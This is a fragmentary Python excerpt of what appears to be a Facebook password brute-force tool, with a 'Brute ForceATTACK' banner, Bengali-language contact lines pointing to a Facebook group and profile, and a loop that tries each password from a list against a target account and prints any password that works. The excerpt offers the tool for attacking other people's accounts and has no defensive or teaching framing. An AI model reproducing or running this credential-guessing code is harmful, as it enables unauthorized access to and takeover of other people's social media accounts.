...
[>] ProxyStatus :> """+str(proxystatus)+wi)
        if not single_passwd:
            print(gr+"""\
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""dark """+wi+"""[~]"""+gr+"""
==================================\n"""+wi)
        else:print("\n")
...
Examples:
     ...
     na bujle amar sathe contact koren
     amader facebook grupe 
     https://facebook.com/groups/426240602403850/
     
     my facebook
     https://www.facebook.com/profile.php?id=100029061534369
     |--------
""")
   ...
   if update:
    ...
    sys.exit(1)
        ...
        for passwd in passwords:
                ...
                write(wi+"["+yl+str(loop)+wi+"] attack running[ {"+yl+str(passwd)+wi+"} ]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> dark"+gr+" hacked\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" id ta lock hoye ase"+yl+" !!!")
                    break
                else:
